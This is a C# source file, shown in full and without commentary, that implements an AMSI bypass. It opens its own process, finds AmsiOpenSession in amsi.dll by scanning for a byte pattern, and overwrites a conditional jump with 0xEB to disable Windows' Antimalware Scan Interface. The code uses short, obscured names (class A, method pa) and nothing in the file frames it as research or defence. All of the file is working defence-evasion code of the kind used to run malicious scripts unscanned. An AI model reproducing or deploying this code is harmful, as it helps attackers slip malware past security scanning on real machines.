using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class A
{

    const int PROCESS_VM_READ = 0x0010;
    const int PROCESS_VM_WRITE = 0x0020;

    static byte[] patch = new byte[] { 0xEB };

    [DllImport("kernel32.dll")]
    static extern IntPtr OpenProcess(int cs, bool a, int ccs);

    [DllImport("kernel32.dll")]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint vdc);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool Process32First(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool Process32Next(IntPtr hSnapshot, ref PROCESSENTRY32 lppe);

    [DllImport("kernel32.dll")]
    static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
    public struct PROCESSENTRY32
    {
        public uint dwSize;
        public uint cntUsage;
        public uint th32ProcessID;
        public IntPtr th32DefaultHeapID;
        public uint th32ModuleID;
        public uint cntThreads;
        public uint th32ParentProcessID;
        public int pcPriClassBase;
        public uint dwFlags;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
        public string szExeFile;
    }

    static int findpattern(byte[] buffer, byte[] pattern)
    {
        int patsize = pattern.Length;
        for (int i = 0; i < buffer.Length - patsize; i++)
        {
            if (pattern[0] == '?' || buffer[i] == pattern[0])
            {
                int j = 1;
                while (j < patsize && (pattern[j] == '?' || buffer[i + j] == pattern[j]))
                    j++;
                if (j == patsize)
                {
                    return i + 3;
                }
            }
        }
        return -1;
    }

    public static int pa()
    {
        int pid = Process.GetCurrentProcess().Id;
        byte[] pattern = new byte[] { 0x48, (byte)'?', (byte)'?', 0x74, (byte)'?', 0x48, (byte)'?', (byte)'?', 0x74 };
        IntPtr cs = OpenProcess(0x0008 | PROCESS_VM_READ | PROCESS_VM_WRITE, false, pid);
        if (cs == IntPtr.Zero)
        {
            return -1;
        }
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr ad = GetProcAddress(amsi, "AmsiOpenSession");
        byte[] adw = new byte[1024];
        ReadProcessMemory(cs, ad, adw, adw.Length, out _);
        int cc = findpattern(adw, pattern);
        if (cc == -1)
        {
            CloseHandle(cs);
            return 144;
        }
        IntPtr csc = IntPtr.Add(ad, cc);
        bool result = WriteProcessMemory(cs, csc, patch, patch.Length, out _);
        CloseHandle(cs);
        return result ? 0 : -1;
    }


    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr LoadLibrary(string ccs);

   
}